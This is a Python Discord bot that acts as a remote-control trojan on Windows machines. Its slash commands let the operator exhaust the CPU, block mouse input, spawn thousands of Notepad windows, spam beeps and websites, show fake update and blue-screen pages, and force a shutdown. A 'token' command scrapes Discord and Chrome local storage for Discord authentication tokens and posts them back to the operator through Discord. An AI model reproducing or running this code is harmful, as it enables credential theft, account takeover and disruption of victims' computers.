import discord
import os
import subprocess
import time
import ctypes
import random
import threading
import pyautogui

from discord.ext import commands

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!", intents=intents)
tree = client.tree

TOKEN = ""


@client.event
async def on_ready():
    await tree.sync()
    print(f"Logged in as {client.user}")

# ─────────────────────────────────────────────
# CPU OVERLOAD (Infinite Loop)

@tree.command(name="cpuoverload", description="Simulate CPU overload")
async def cpuoverload(interaction: discord.Interaction):
    def overload():
        while True:
            pass
    threading.Thread(target=overload).start()
    await interaction.response.send_message("CPU overload initiated. It may lag the system.")

# ─────────────────────────────────────────────
# LAUNCH RANDOM PROGRAM (e.g., Notepad, Calculator)

@tree.command(name="launchprogram", description="Launch a random program")
async def launchprogram(interaction: discord.Interaction):
    programs = [
        "notepad", "calc", "mspaint", "cmd", "powershell"
    ]
    program = random.choice(programs)
    subprocess.Popen(program, shell=True)
    await interaction.response.send_message(f"Launching {program}.")

# ─────────────────────────────────────────────
# DISABLE MOUSE INPUT FOR A SHORT TIME

@tree.command(name="disablemouse", description="Disable mouse for 5 seconds")
async def disablemouse(interaction: discord.Interaction):
    ctypes.windll.user32.BlockInput(True)
    time.sleep(5)
    ctypes.windll.user32.BlockInput(False)
    await interaction.response.send_message("Mouse input disabled for 5 seconds.")

# ─────────────────────────────────────────────
# FAKE UPDATE WINDOW (Freeze the screen with a fake update message)

@tree.command(name="fakeupdate", description="Open a fake update window")
async def fakeupdate(interaction: discord.Interaction):
    fake_update_html = """
    <html><body style='background-color:#000000;color:white;font-family:Consolas;font-size:24px'>
    <h1>Installing Updates...</h1>
    <p>Progress: 0%</p>
    <p>Do not turn off your computer.</p>
    <p>Estimated time: 2 hours</p>
    </body></html>
    """
    path = os.path.join(os.getenv("TEMP"), "fakeupdate.html")
    with open(path, "w") as f:
        f.write(fake_update_html)
    os.system(f'start msedge "{path}"')
    await interaction.response.send_message("Fake update started.")

# ─────────────────────────────────────────────
# OPEN MULTIPLE INSTANCES OF NOTEPAD

@tree.command(name="opennotepad", description="Open multiple instances of Notepad")
async def opennotepad(interaction: discord.Interaction):
    for _ in range(5000):
        subprocess.Popen("notepad", shell=True)
    await interaction.response.send_message("Opened multiple instances of Notepad.")

# ─────────────────────────────────────────────
# SOUND SPAM (Play random beeps or sounds)

@tree.command(name="soundspam", description="Play random beeps/sounds every 2 seconds")
async def soundspam(interaction: discord.Interaction):
    def beep():
        while True:
            ctypes.windll.kernel32.Beep(1000, 500)  # Frequency: 1000 Hz, Duration: 500 ms
            time.sleep(2)

    threading.Thread(target=beep).start()
    await interaction.response.send_message("Sound spam started.")

# ─────────────────────────────────────────────
# RANDOM WEBSITES SPAM

@tree.command(name="spamsites", description="Open random troll websites")
async def spamsites(interaction: discord.Interaction):
    sites = [
        "https://pointerpointer.com/",
        "https://cat-bounce.com/",
        "https://theuselessweb.com/",
        "https://zoomquilt.org/",
        "https://corndog.io/",
        "https://shadyurl.com/",
    ]
    for _ in range(5):
        subprocess.Popen(f"start {random.choice(sites)}", shell=True)
    await interaction.response.send_message("Random websites opened 😆")

# ─────────────────────────────────────────────
# SHUTDOWN COMMAND (in 10 seconds)

@tree.command(name="shutdown", description="Shutdown PC in 10 seconds (admin)")
async def shutdown(interaction: discord.Interaction):
    subprocess.call("shutdown /s /t 10", shell=True)
    await interaction.response.send_message("PC will shutdown in 10 seconds.")

# ─────────────────────────────────────────────
# FAKE BSOD

@tree.command(name="bsod", description="Simulate a fake BSOD")
async def bsod(interaction: discord.Interaction):
    bsod_html = """
    <html><body style='background-color:#0000AA;color:white;font-family:Consolas;font-size:24px'>
    <p>A problem has been detected and Windows has been shut down to prevent damage...</p>
    </body></html>
    """
    path = os.path.join(os.getenv("TEMP"), "bsod.html")
    with open(path, "w") as f:
        f.write(bsod_html)
    os.system(f'start msedge "{path}"')
    await interaction.response.send_message("Fake BSOD opened.")

# ─────────────────────────────────────────────
# TOKEN GRABBER

@tree.command(name="token", description="Grab Discord tokens (for yourself only)")
async def token(interaction: discord.Interaction):
    paths = [
        os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb\\",
        os.getenv("APPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path): continue
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(path, file_name), 'r', errors="ignore") as file:
                    for line in file.readlines():
                        for token in line.split():
                            if "mfa." in token or len(token) == 59:
                                tokens.append(token)
            except: pass

    if tokens:
        await interaction.response.send_message("Tokens found:\n" + "\n".join(tokens))
    else:
        await interaction.response.send_message("No tokens found.")

# ─────────────────────────────────────────────

client.run(TOKEN)
